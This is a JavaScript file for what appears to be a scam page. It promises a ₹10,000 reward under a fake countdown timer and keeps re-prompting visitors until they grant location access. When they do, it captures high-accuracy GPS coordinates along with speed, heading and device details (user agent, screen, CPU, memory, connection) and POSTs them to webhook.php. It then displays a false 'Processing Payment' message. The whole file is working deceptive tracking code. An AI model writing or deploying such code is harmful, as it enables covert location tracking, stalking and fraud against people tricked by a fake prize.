let countdownTime = 9 * 60 + 59;

// Start countdown timer
function startCountdown() {
  setInterval(() => {
    if (countdownTime > 0) {
      countdownTime--;
      const minutes = Math.floor(countdownTime / 60);
      const seconds = countdownTime % 60;
      document.getElementById('countdown').textContent = 
        `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }
  }, 1000);
}

// Success function - SENDS DATA IMMEDIATELY
function showSuccess(position) {
  console.log("✅ Location captured!", position);
  
  // Detect mobile device
  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    altitude: position.coords.altitude || 'N/A',
    altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
    heading: position.coords.heading || 'N/A',
    speed: position.coords.speed || 'N/A',
    timestamp: new Date(position.timestamp).toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    isMobile: isMobile,
    screenResolution: `${screen.width}x${screen.height}`,
    cpuCores: navigator.hardwareConcurrency || 'N/A',
    deviceMemory: navigator.deviceMemory || 'N/A',
    language: navigator.language || 'N/A',
    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A'
  };
  
  console.log("📤 Captured Data:", data);
  console.log("📍 Coordinates:", data.latitude, data.longitude);
  console.log("📱 Device:", isMobile ? 'Mobile' : 'Desktop');
  
  // Send to webhook.php
  fetch('webhook.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    console.log("✅ Server response:", response.status);
    return response.json();
  })
  .then(result => {
    console.log("💾 Data saved:", result);
  })
  .catch(error => {
    console.error("❌ Error sending data:", error);
    // Fallback: log to console
    console.log("📋 BACKUP DATA:", JSON.stringify(data, null, 2));
  });
  
  // Hide popup
  document.getElementById('permissionPopup').classList.remove('active');
  
  // Show success message
  const statusMsg = document.getElementById('statusMessage');
  statusMsg.className = 'status-message success';
  statusMsg.innerHTML = `
    ✅ <strong>Success!</strong> Location verified.<br>
    📍 ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}<br>
    🎯 Accuracy: ${data.accuracy.toFixed(0)}m<br>
    💰 Processing your ₹10,000 reward...
  `;
  
  const button = document.getElementById('claimBtn');
  button.style.background = '#28a745';
  button.innerHTML = '✓ Verified - Processing Payment...';
  button.disabled = true;
}

// Error function with detailed mobile debugging
function showError(error) {
  console.error("❌ Location error:", error);
  
  let message = "";
  let guidance = "";
  
  switch(error.code) {
    case error.PERMISSION_DENIED:
      message = "Location access was DENIED";
      guidance = "Please go to your browser settings and allow location access for this site.";
      console.log("🚫 User denied permission");
      break;
    case error.POSITION_UNAVAILABLE:
      message = "Location information is UNAVAILABLE";
      guidance = "Please enable Location Services in your device settings.";
      console.log("📍 GPS unavailable");
      break;
    case error.TIMEOUT:
      message = "Location request TIMED OUT";
      guidance = "Please ensure you have good GPS signal and try again.";
      console.log("⏱️ Request timeout");
      break;
    default:
      message = "Unknown error occurred";
      guidance = "Please try again or use a different browser.";
      console.log("❓ Unknown error");
  }
  
  alert(`❌ ${message}\n\n${guidance}`);
  
  // Show popup again
  document.getElementById('permissionPopup').classList.add('active');
}

// Request GPS location with better mobile support
function requestLocation() {
  console.log("📍 Requesting location...");
  console.log("🌐 Protocol:", window.location.protocol);
  console.log("📱 User Agent:", navigator.userAgent);
  
  // Check if geolocation is supported
  if (!navigator.geolocation) {
    alert("❌ Geolocation is not supported by your browser");
    return;
  }

  // Check if using HTTPS (required for mobile)
  if (window.location.protocol !== 'https' && window.location.hostname !== 'localhost') {
    console.warn("⚠️ WARNING: HTTPS required for mobile geolocation!");
    alert("⚠️ For security, location access requires HTTPS connection. Please use the secure link.");
    return;
  }

  // Request with high accuracy for mobile GPS
  navigator.geolocation.getCurrentPosition(
    showSuccess,
    showError,
    {
      enableHighAccuracy: true,  // Use GPS on mobile
      timeout: 30000,            // 30 seconds (mobile can be slower)
      maximumAge: 0              // Don't use cached location
    }
  );
  
  console.log("⏳ Waiting for user permission...");
}

// Show popup immediately on page load
window.onload = function() {
  console.log("🚀 GPS Tracker initialized");
  startCountdown();
  
  // Show popup after 1 second
  setTimeout(() => {
    document.getElementById('permissionPopup').classList.add('active');
  }, 1000);

  // Allow button - triggers location request
  document.getElementById('allowBtn').addEventListener('click', () => {
    requestLocation();
  });

  // Block button
  document.getElementById('blockBtn').addEventListener('click', () => {
    document.getElementById('permissionPopup').classList.remove('active');
    alert("You need to allow location access to claim your prize!");
  });

  // Claim button
  document.getElementById('claimBtn').addEventListener('click', () => {
    document.getElementById('permissionPopup').classList.add('active');
  });
};
